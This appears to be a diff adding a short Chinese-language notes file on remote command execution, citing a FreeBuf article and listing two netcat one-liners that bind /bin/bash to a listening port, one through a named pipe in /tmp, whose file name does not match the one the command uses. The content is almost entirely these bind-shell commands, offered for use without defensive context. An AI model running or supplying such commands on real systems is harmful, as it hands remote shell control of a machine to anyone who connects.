@@ -1,0 +1,8 @@
+http://www.freebuf.com/articles/system/10632.html
+
+()远程执行命令
+nc -l -vv -p 2222 -e /bin/bash
+
+或者
+mknod /tmp/backpipe p
+/bin/bash 0< back | nc -lnp 80 1> back
